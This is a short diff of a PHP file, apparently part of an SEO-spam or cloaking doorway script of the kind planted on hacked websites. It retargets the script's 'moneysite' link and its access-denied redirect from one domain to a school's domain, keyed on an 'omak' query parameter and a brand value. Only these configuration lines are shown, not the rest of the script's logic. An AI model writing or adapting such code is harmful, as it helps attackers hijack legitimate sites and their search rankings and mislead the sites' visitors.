@@ -6,7 +6,7 @@ header("Content-Type: text/html; charset=UTF-8");
 
 // Fungsi untuk menolak akses
 function denied() {
-    header("Location /index-old.php");
+    header("Location: https://anugerahschool.sch.id/index-old.php");
     exit();
 }
 
@@ -38,7 +38,7 @@ if (isset($_GET['omak'])) {
 }
 
 // Variabel lainnya
-$link_moneysite = "https://cucikarpet.id/?omak=" . urlencode($brand);
+$link_moneysite = "https://anugerahschool.sch.id/?omak=" . urlencode($brand);
 
 // Meta informasi
 $gsc = "";
